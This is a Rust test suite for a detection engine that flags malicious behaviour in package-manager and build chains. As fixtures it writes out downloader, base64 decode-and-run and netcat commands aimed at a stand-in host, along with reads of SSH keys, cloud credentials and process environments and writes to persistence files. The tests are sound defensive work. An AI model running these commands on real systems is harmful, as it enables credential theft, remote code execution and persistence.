//! One case where each rule fires and one where it must not, plus the scoring
//! and anchoring rules they lean on. Every case runs through the whole engine,
//! so a rule is tested in the chain context it sees in a real capture.
//!
//! L12 has no tests: it is not implemented until a real SSH login is captured.

mod common;

use common::*;
use secrisk_engine::{
    Engine,
    chain::AnchorKind,
    mitre::Tactic,
    report::Kind,
    rules::RuleId::{self, *},
    score::Severity,
};
use serde_json::json;

fn fires(s: &Scenario, rule: RuleId) -> bool {
    s.fired().contains(&rule)
}

/// A user's own program (pid 200), run from the terminal: no dependency chain.
fn user(path: &str, cmdline: &str) -> Scenario {
    let mut s = Scenario::new();
    s.exec(0, 200, 50, path, cmdline);
    s
}

fn as_root(s: &mut Scenario) -> &mut Scenario {
    s.events.last_mut().unwrap().uid = 0;
    s
}

fn in_container(s: &mut Scenario) -> &mut Scenario {
    s.events.last_mut().unwrap().container = Some("4f3c2a1b9e8d".into());
    s
}

// --- Process ----------------------------------------------------------------

#[test]
fn p1_shell_under_a_package_manager() {
    assert!(fires(&Scenario::under_npm(), P1));
}

#[test]
fn p1_not_for_a_shell_script_the_user_runs() {
    let mut s = user("/usr/bin/bash", "bash ./deploy.sh");
    s.exec(1, 201, 200, "/usr/bin/sh", "sh -c make");
    assert!(!fires(&s, P1));
}

#[test]
fn p2_downloader_under_a_package_manager() {
    let mut s = Scenario::under_npm();
    s.exec(2, 102, 101, "/usr/bin/wget", "wget -q http://203.0.113.9/x");
    assert!(fires(&s, P2));
}

#[test]
fn p2_not_for_curl_from_the_terminal() {
    assert!(!fires(
        &user("/usr/bin/curl", "curl https://example.com"),
        P2
    ));
}

#[test]
fn p3_exec_from_a_staging_dir() {
    assert!(fires(&user("/dev/shm/.x", "/dev/shm/.x"), P3));
}

#[test]
fn p3_not_for_a_system_binary() {
    assert!(!fires(&user("/usr/bin/ls", "ls /tmp"), P3));
}

#[test]
fn l1_exec_of_a_file_the_chain_wrote() {
    let mut s = user("/usr/bin/bash", "bash ./get.sh");
    s.write(1, 200, "/home/u/.local/bin/updater").exec(
        2,
        201,
        200,
        "/home/u/.local/bin/updater",
        "updater",
    );
    assert!(fires(&s, L1));
}

#[test]
fn l1_not_for_a_binary_the_chain_did_not_write() {
    let mut s = user("/usr/bin/bash", "bash ./get.sh");
    s.write(1, 200, "/home/u/.local/bin/other").exec(
        2,
        201,
        200,
        "/home/u/.local/bin/updater",
        "updater",
    );
    assert!(!fires(&s, L1));
}

#[test]
fn l3_decode_and_run_under_a_package_manager() {
    let mut s = Scenario::under_npm();
    s.exec(
        2,
        102,
        101,
        "/usr/bin/sh",
        "sh -c echo Y3VybCBldmls | base64 -d | sh",
    );
    assert!(fires(&s, L3));
}

#[test]
fn l3_not_from_the_terminal() {
    let s = user("/usr/bin/sh", "sh -c echo aGk= | base64 -d | sh");
    assert!(!fires(&s, L3));
}

#[test]
fn l5_decompressing_test_data_in_a_build() {
    let mut s = Scenario::under_make();
    s.exec(
        2,
        102,
        101,
        "/usr/bin/xz",
        "xz -dc tests/files/good-large.xz",
    );
    assert!(fires(&s, L5));
}

#[test]
fn l5_not_for_unpacking_a_source_tarball() {
    let mut s = Scenario::under_make();
    s.exec(2, 102, 101, "/usr/bin/xz", "xz -dc ../foo-1.2.tar.xz");
    assert!(!fires(&s, L5));
}

#[test]
fn l12_command_directly_under_the_sshd_listener() {
    // The backdoor shape: sshd listener spawns a shell with no session worker.
    let mut s = Scenario::new();
    s.exec(0, 777, 1, "/usr/sbin/sshd", "sshd: [listener]")
        .exec(1, 800, 777, "/usr/bin/bash", "bash -c id");
    assert!(fires(&s, L12));
}

#[test]
fn l12_not_for_a_normal_login_through_a_session_process() {
    // sshd -> sshd-session -> sshd-auth -> the user's shell.
    let mut s = Scenario::new();
    s.exec(0, 777, 1, "/usr/sbin/sshd", "sshd: [listener]")
        .exec(1, 801, 777, "/usr/lib/openssh/sshd-session", "sshd-session")
        .exec(2, 802, 801, "/usr/lib/openssh/sshd-auth", "sshd-auth")
        .exec(3, 803, 802, "/usr/bin/bash", "-bash");
    assert!(!fires(&s, L12));
}

#[test]
fn l12_not_for_the_listener_spawning_its_session_worker() {
    let mut s = Scenario::new();
    s.exec(0, 777, 1, "/usr/sbin/sshd", "sshd: [listener]")
        .exec(1, 804, 777, "/usr/lib/openssh/sshd-session", "sshd-session");
    assert!(!fires(&s, L12));
}

// --- File -------------------------------------------------------------------

#[test]
fn f1_ssh_key_read_under_a_package_manager() {
    let mut s = Scenario::under_npm();
    s.exec(2, 102, 101, "/usr/bin/cat", "cat /home/u/.ssh/id_rsa")
        .read_secret(2, 102, "/home/u/.ssh/id_rsa");
    let hit = s.hit(F1).expect("F1");
    assert_eq!(hit.technique, "T1552.004");
    assert_eq!(hit.tactic, Some(Tactic::CredentialAccess));
}

#[test]
fn f1_not_for_ssh_reading_its_own_key() {
    let mut s = user("/usr/bin/ssh", "ssh host");
    s.read_secret(1, 200, "/home/u/.ssh/id_ed25519");
    assert!(!fires(&s, F1));
}

#[test]
fn f1_env_file_counts_only_in_a_dependency_chain() {
    let mut dep = Scenario::under_npm();
    dep.exec(2, 102, 101, "/usr/bin/cat", "cat ../../.env")
        .read_secret(2, 102, "/home/u/proj/.env");
    assert!(fires(&dep, F1));

    let mut app = user("/usr/bin/node", "node server.js");
    app.read_secret(1, 200, "/home/u/proj/.env");
    assert!(!fires(&app, F1));
}

#[test]
fn f1_not_for_a_public_ca_bundle() {
    let mut s = Scenario::under_npm();
    s.read_secret(2, 101, "/etc/ssl/certs/ca-certificates.pem");
    assert!(!fires(&s, F1));
}

#[test]
fn f2_staging_writes() {
    for path in ["/dev/shm/.cache", "/tmp/.X11-lock2", "/var/tmp/.k"] {
        let mut s = user("/usr/bin/python3", "python3 x.py");
        s.write(1, 200, path);
        assert!(fires(&s, F2), "{path}");
    }
}

#[test]
fn f2_not_for_an_ordinary_temp_file() {
    let mut s = user("/usr/bin/python3", "python3 x.py");
    s.write(1, 200, "/tmp/build.log");
    assert!(!fires(&s, F2));
}

#[test]
fn f3_to_f6_persistence_writes() {
    for (path, rule) in [
        ("/home/u/.bashrc", F3),
        ("/home/u/.profile", F3),
        ("/etc/cron.d/update", F4),
        ("/var/spool/cron/crontabs/u", F4),
        ("/etc/systemd/system/update.service", F5),
        ("/home/u/.config/systemd/user/update.service", F5),
        ("/home/u/.ssh/authorized_keys", F6),
    ] {
        let mut s = user("/usr/bin/python3", "python3 x.py");
        s.write(1, 200, path);
        assert!(fires(&s, rule), "{path} should fire {rule:?}");
    }
}

#[test]
fn f3_to_f6_not_for_neighbouring_files() {
    for path in [
        "/home/u/.bashrc.bak",
        "/etc/cups/cupsd.conf",
        "/etc/systemd/resolved.conf",
        "/home/u/.ssh/known_hosts",
    ] {
        let mut s = user("/usr/bin/python3", "python3 x.py");
        s.write(1, 200, path);
        assert_eq!(s.fired(), Vec::<RuleId>::new(), "{path}");
    }
}

#[test]
fn l6_object_file_written_by_a_non_compiler_in_a_build() {
    let mut s = Scenario::under_make();
    s.write(2, 101, "/build/src/liblzma/crc64_fast.o");
    assert!(fires(&s, L6));
}

#[test]
fn l6_not_for_compilers() {
    for (exe, cmdline) in [
        (
            "/usr/bin/x86_64-linux-gnu-gcc-13",
            "x86_64-linux-gnu-gcc-13 -c a.c",
        ),
        ("/usr/bin/as", "as -o a.o a.s"),
        ("/usr/lib/go/pkg/tool/linux_amd64/compile", "compile -o a.a"),
    ] {
        let mut s = Scenario::under_make();
        s.exec(2, 102, 101, exe, cmdline)
            .write(3, 102, "/build/a.o");
        assert!(!fires(&s, L6), "{exe}");
    }
}

#[test]
fn l6_not_outside_a_build() {
    let mut s = user("/usr/bin/cp", "cp a.o /home/u/lib/");
    s.write(1, 200, "/home/u/lib/a.o");
    assert!(!fires(&s, L6));
}

#[test]
fn l7_dependency_writes_a_system_binary() {
    let mut s = Scenario::under_npm();
    s.write(2, 101, "/usr/local/bin/node-helper");
    assert!(fires(&s, L7));
}

#[test]
fn l7_not_for_the_package_manager_itself() {
    // npm install -g links the package's bin into /usr/local/bin.
    let mut s = Scenario::new();
    s.exec(0, 100, 50, "/usr/bin/npm", "node /usr/bin/npm install -g x")
        .write(1, 100, "/usr/local/bin/x");
    assert!(!fires(&s, L7));
}

#[test]
fn l8_env_dump_under_a_package_manager() {
    let mut s = Scenario::under_npm();
    s.exec(2, 102, 101, "/usr/bin/env", "env");
    assert!(fires(&s, L8));
}

#[test]
fn l8_reading_another_process_environ() {
    let mut s = Scenario::under_npm();
    s.read_secret(2, 101, "/proc/1/environ");
    assert!(fires(&s, L8));
}

#[test]
fn l8_not_for_a_process_reading_its_own_environ() {
    let mut s = Scenario::under_npm();
    s.read_secret(2, 101, "/proc/101/environ");
    assert!(!fires(&s, L8));
}

#[test]
fn l8_not_from_the_terminal() {
    assert!(!fires(&user("/usr/bin/env", "env"), L8));
}

#[test]
fn l10_system_files_map_by_target() {
    for (path, technique, tactic) in [
        ("/etc/passwd", "T1136.001", Some(Tactic::Persistence)),
        (
            "/etc/sudoers.d/90-npm",
            "T1548.003",
            Some(Tactic::PrivilegeEscalation),
        ),
        ("/etc/hosts", "heuristic", None),
    ] {
        let mut s = Scenario::under_npm();
        s.write(2, 101, path);
        let hit = s.hit(L10).unwrap_or_else(|| panic!("{path}"));
        assert_eq!((hit.technique, hit.tactic), (technique, tactic), "{path}");
    }
}

#[test]
fn l10_not_outside_a_dependency_chain() {
    let mut s = user("/usr/bin/vim", "vim /etc/hosts");
    s.write(1, 200, "/etc/hosts");
    assert!(!fires(&s, L10));
}

#[test]
fn l11_package_cache_written_by_someone_else() {
    let mut s = Scenario::under_npm();
    s.write(2, 101, "/home/u/.npm/_cacache/content-v2/sha512/ab/cd");
    assert!(fires(&s, L11));
}

#[test]
fn l11_not_for_the_cache_owner() {
    let mut npm = Scenario::new();
    npm.exec(0, 100, 50, "/usr/bin/npm", "node /usr/bin/npm install")
        .write(1, 100, "/home/u/.npm/_cacache/index-v5/aa/bb");
    assert!(!fires(&npm, L11));

    let mut gradle = user(
        "/usr/lib/jvm/bin/java",
        "java -cp gradle.jar org.gradle.launcher.daemon.bootstrap.GradleDaemon",
    );
    gradle.write(1, 200, "/home/u/.gradle/caches/modules-2/x.jar");
    assert!(!fires(&gradle, L11));
}

// --- Network ----------------------------------------------------------------

#[test]
fn n1_dependency_connects_out() {
    let mut s = Scenario::under_npm();
    s.exec(2, 102, 101, "/usr/bin/curl", "curl http://203.0.113.9/")
        .connect(3, 102, "203.0.113.9", 80);
    assert!(fires(&s, N1));
}

#[test]
fn n1_not_for_the_package_manager_fetching_packages() {
    let mut s = Scenario::new();
    s.exec(0, 100, 50, "/usr/bin/npm", "node /usr/bin/npm install")
        .connect(1, 100, "104.16.0.35", 443);
    assert!(!fires(&s, N1));
}

#[test]
fn network_rules_ignore_loopback() {
    let mut s = Scenario::under_npm();
    s.connect(2, 101, "127.0.0.1", 9229);
    assert_eq!(
        s.fired()
            .iter()
            .filter(|r| matches!(r, N1 | N2 | N3 | L2))
            .count(),
        0
    );
}

#[test]
fn n2_connect_after_a_secret_read() {
    let mut s = user("/usr/bin/python3", "python3 /home/u/steal.py");
    s.read_secret(1, 200, "/home/u/.aws/credentials")
        .connect(2, 200, "203.0.113.9", 443);
    assert!(fires(&s, N2));
}

#[test]
fn n2_not_when_the_connect_came_first() {
    let mut s = user("/usr/bin/python3", "python3 /home/u/steal.py");
    s.connect(1, 200, "203.0.113.9", 443)
        .read_secret(2, 200, "/home/u/.aws/credentials");
    assert!(!fires(&s, N2));
}

#[test]
fn n3_counts_only_beside_n1_or_n2() {
    let mut alone = user("/usr/bin/python3", "python3 client.py");
    alone.connect(1, 200, "10.0.0.5", 5432);
    let hit = alone.hit(N3).expect("N3 recorded");
    let summary = summaries(&alone.run())[0].clone();
    assert!(!summary.rules.iter().any(|r| r.id == N3 && r.counted));
    assert_eq!((summary.score, hit.points), (0, 5));

    let mut dep = Scenario::under_npm();
    dep.exec(2, 102, 101, "/usr/bin/nc", "nc 203.0.113.9 4444")
        .connect(3, 102, "203.0.113.9", 4444);
    assert!(counted(summaries(&dep.run())[0]).contains(&N3));
}

#[test]
fn n3_not_for_common_ports() {
    for port in [22, 53, 80, 443] {
        let mut s = Scenario::under_npm();
        s.connect(2, 101, "203.0.113.9", port);
        assert!(!fires(&s, N3), "{port}");
    }
}

#[test]
fn l2_shell_holds_the_socket() {
    let mut s = user("/usr/bin/bash", "bash -i");
    s.connect(1, 200, "203.0.113.9", 4444);
    assert!(fires(&s, L2));
}

#[test]
fn l2_not_for_a_tool_the_shell_ran() {
    let mut s = user("/usr/bin/bash", "bash ./fetch.sh");
    s.exec(1, 201, 200, "/usr/bin/curl", "curl https://example.com")
        .connect(2, 201, "93.184.216.34", 443);
    assert!(!fires(&s, L2));
}

// --- Context ----------------------------------------------------------------

#[test]
fn c1_counts_only_beside_another_rule() {
    let mut clean = Scenario::new();
    clean.exec(0, 100, 50, "/usr/bin/npm", "node /usr/bin/npm install");
    let summary = summaries(&clean.run())[0].clone();
    assert_eq!(summary.rules.len(), 1);
    assert!(!summary.rules[0].counted);
    assert_eq!(summary.score, 0);

    assert!(counted(summaries(&Scenario::under_npm().run())[0]).contains(&C1));
}

#[test]
fn c1_not_for_a_user_command() {
    assert!(!fires(&user("/usr/bin/ls", "ls"), C1));
}

#[test]
fn c2_root_under_a_non_root_anchor() {
    let mut s = Scenario::under_npm();
    s.exec(2, 102, 101, "/usr/bin/sudo", "sudo tee /etc/x");
    as_root(&mut s);
    assert!(fires(&s, C2));
}

#[test]
fn c2_not_when_the_anchor_is_root() {
    let mut s = Scenario::new();
    s.exec(0, 100, 50, "/usr/bin/npm", "node /usr/bin/npm install -g x");
    as_root(&mut s).exec(1, 101, 100, "/usr/bin/sh", "sh -c node install.js");
    as_root(&mut s);
    assert!(!fires(&s, C2));
}

#[test]
fn l9_container_tool_inside_a_container() {
    let mut s = user("/usr/bin/docker", "docker run --privileged -v /:/host x");
    in_container(&mut s);
    assert!(fires(&s, L9));
}

#[test]
fn l9_not_on_the_host() {
    let s = user("/usr/bin/docker", "docker ps");
    assert!(!fires(&s, L9));
}

#[test]
fn c3_tactics_in_kill_chain_order() {
    // Credential Access -> Collection -> Exfiltration.
    let mut s = user("/usr/bin/python3", "python3 /home/u/steal.py");
    s.read_secret(1, 200, "/home/u/.ssh/id_rsa")
        .write(2, 200, "/dev/shm/.k")
        .connect(3, 200, "203.0.113.9", 443);
    let hit = s.hit(C3).expect("C3");
    assert_eq!(
        hit.detail,
        "Credential Access -> Collection -> Exfiltration"
    );
}

#[test]
fn c3_not_when_tactics_arrive_out_of_order() {
    // Collection before Credential Access: the longest ordered run is two.
    let mut s = user("/usr/bin/python3", "python3 /home/u/steal.py");
    s.write(1, 200, "/dev/shm/.k")
        .read_secret(2, 200, "/home/u/.ssh/id_rsa")
        .connect(3, 200, "203.0.113.9", 443);
    let fired = s.fired();
    assert!(fired.contains(&N2) && !fired.contains(&C3));
}

// --- Scoring ----------------------------------------------------------------

#[test]
fn severity_band_edges() {
    let bands: Vec<Severity> = [0, 30, 31, 60, 61, 80, 81, 100]
        .into_iter()
        .map(Severity::of)
        .collect();
    use Severity::*;
    assert_eq!(
        bands,
        [Low, Low, Medium, Medium, High, High, Critical, Critical]
    );
}

#[test]
fn components_are_capped() {
    // F1 25 + F2 10 + F3 20 = 55 file points, capped at 25.
    let mut s = user("/usr/bin/python3", "python3 x.py");
    s.read_secret(1, 200, "/home/u/.ssh/id_rsa")
        .write(2, 200, "/dev/shm/.k")
        .write(3, 200, "/home/u/.bashrc");
    let summary = summaries(&s.run())[0].clone();
    assert_eq!(summary.components.file, 25);
}

#[test]
fn a_rule_fires_once_per_chain() {
    let mut s = Scenario::under_npm();
    s.exec(2, 102, 101, "/usr/bin/cat", "cat id_rsa")
        .read_secret(2, 102, "/home/u/.ssh/id_rsa")
        .exec(3, 103, 101, "/usr/bin/cat", "cat id_ed25519")
        .read_secret(3, 103, "/home/u/.ssh/id_ed25519");
    let summary = summaries(&s.run())[0].clone();
    let f1: Vec<_> = summary.rules.iter().filter(|r| r.id == F1).collect();
    assert_eq!(f1.len(), 1);
    assert_eq!(f1[0].pid, 102, "the first hit is kept");
}

// --- Anchors ----------------------------------------------------------------

#[test]
fn outermost_package_manager_anchors_a_native_build() {
    let mut s = Scenario::under_npm();
    s.exec(2, 102, 101, "/usr/bin/make", "make -C build")
        .exec(3, 103, 102, "/usr/bin/sh", "/bin/sh -c ./gen.sh")
        .write(4, 103, "/home/u/proj/build/addon.o");
    let reports = s.run();
    let chains = summaries(&reports);
    assert_eq!(chains.len(), 1, "make joins npm's chain");
    assert_eq!(chains[0].anchor.name, "npm");
    // The build flag still comes from make, below the anchor.
    assert!(counted(chains[0]).contains(&L6));
}

#[test]
fn c4_script_inside_node_modules_is_its_own_anchor() {
    let mut s = Scenario::new();
    s.exec(
        0,
        300,
        50,
        "/usr/bin/node",
        "node /home/u/proj/node_modules/evil/index.js",
    )
    .exec(1, 301, 300, "/usr/bin/curl", "curl http://203.0.113.9/");
    let last = summaries(&s.run())[0].clone();
    assert_eq!(last.anchor.kind, AnchorKind::RuntimeDependency);
    assert!(counted(&last).contains(&P2));
}

#[test]
fn a_reused_pid_starts_a_new_chain() {
    let mut s = Scenario::new();
    s.exec(0, 100, 50, "/usr/bin/npm", "node /usr/bin/npm install")
        .exec(1, 60, 10, "/usr/bin/zsh", "zsh")
        // pid 100 comes back under a different parent: a new process.
        .exec(2, 100, 60, "/usr/bin/npm", "node /usr/bin/npm install")
        .push(3, 100, "write", json!({"path": "/home/u/x"}));
    let mut engine = Engine::new(true);
    let mut reports: Vec<_> = s.events.iter().flat_map(|e| engine.process(e)).collect();
    reports.extend(engine.finish());
    let npm_chains = reports
        .iter()
        .filter(|r| r.record == Kind::Chain && r.anchor.name == "npm")
        .count();
    assert_eq!(npm_chains, 2);
}
